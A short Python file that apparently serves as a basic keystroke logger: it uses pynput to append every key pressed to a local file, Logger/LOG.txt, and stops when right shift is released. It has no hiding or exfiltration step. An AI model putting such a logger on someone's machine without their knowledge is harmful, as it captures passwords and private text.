from pynput.keyboard import Listener


def convert_key(key) -> str:
    return str(key).replace("'", '').split('.')[-1]


def on_press(key) -> None:
    key = convert_key(key)
    with open('Logger/LOG.txt', 'a') as file:
        file.write('\n' if key == 'space' else key)


def on_release(key) -> bool | None:
    key = convert_key(key)
    return False if key == 'shift_r' else None


def keyboard_listener() -> None:
    with Listener(on_press=on_press, on_release=on_release) as keyboard:
        keyboard.join()


if __name__ == '__main__':
    print(convert_key('Key.ctrl_l'))
    print(convert_key('Key.shift_r'))
    print(convert_key('Key.a'))
    print(convert_key('Key.esc'))
